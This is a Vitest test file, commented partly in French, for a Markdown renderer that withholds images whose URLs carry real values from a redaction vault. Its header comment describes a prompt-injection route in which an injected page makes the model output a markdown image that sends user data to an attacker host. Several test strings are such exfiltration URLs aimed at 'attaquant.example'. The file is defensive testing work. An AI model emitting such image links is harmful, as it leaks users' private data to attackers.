// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { getMessages } from "@openmasq/i18n";
import { Markdown } from "../Markdown";
import { mount } from "../../../testKit";

/**
 * The link preview's hole, seen through an `<img>` — and worse, because a link at least
 * needed a click. `![](https://attaquant.example/?d=<fake>)` is a shape an injected page
 * can dictate to the model (which only holds fakes); the reply is un-redacted before
 * markdown parses it, so the browser would GET the REAL value from an attacker-chosen
 * host the instant the bubble paints. There was no gate here at all.
 *
 * Loading it stays available: the placeholder's click is the USER's action, which is what
 * rule 11's outward-real covers — unlike an automatic fetch, which is nobody's.
 */
const VAULT = {
  "Karl Studio": "Norvik Group",
  "contact@karl-studio.test": "lea.morvan@norvik.example",
};
const t = getMessages("fr"); // `useT()` hors provider rend la langue par défaut

const render = (content: string) => mount(<Markdown content={content} vault={VAULT} />);

describe("MarkdownImage — une image dont l'URL porte une valeur du coffre", () => {
  it("NE CHARGE PAS l'image et propose de le faire (valeur non encodée)", async () => {
    const ui = await render(
      "![figure](https://attaquant.example/p.png?d=lea.morvan@norvik.example)",
    );
    // Aucune balise <img> : rien n'est demandé au réseau, ni même en attente.
    expect(ui.maybe("img")).toBeNull();
    const btn = ui.find<HTMLButtonElement>(".md-img-withheld");
    expect(btn.textContent).toContain(t.conversation.bubble.imageWithheld);
    expect(btn.textContent).toContain(t.conversation.bubble.imageWithheldLoad);
    await ui.unmount();
  });

  it("ne charge pas non plus la forme percent-encodée", async () => {
    const ui = await render("![figure](https://attaquant.example/p.png?d=Norvik%20Group)");
    expect(ui.maybe("img")).toBeNull();
    expect(ui.maybe(".md-img-withheld")).not.toBeNull();
    await ui.unmount();
  });

  it("le CLIC charge l'image — la décision revient à la personne", async () => {
    const ui = await render("![figure](https://attaquant.example/p.png?d=Norvik%20Group)");
    await ui.click(".md-img-withheld");
    expect(ui.find<HTMLImageElement>("img").getAttribute("src")).toContain("Norvik");
    expect(ui.maybe(".md-img-withheld")).toBeNull();
    await ui.unmount();
  });

  it("une image ORDINAIRE se charge comme avant — la garde ne tue pas la fonction", async () => {
    const ui = await render("![figure](https://images.example/photo.png)");
    expect(ui.find<HTMLImageElement>("img").getAttribute("src")).toBe(
      "https://images.example/photo.png",
    );
    expect(ui.maybe(".md-img-withheld")).toBeNull();
    await ui.unmount();
  });

  it("les CLÉS du coffre ne retiennent rien : le modèle les a déjà", async () => {
    const ui = await render("![figure](https://images.example/p.png?d=Karl%20Studio)");
    expect(ui.maybe("img")).not.toBeNull();
    expect(ui.maybe(".md-img-withheld")).toBeNull();
    await ui.unmount();
  });
});
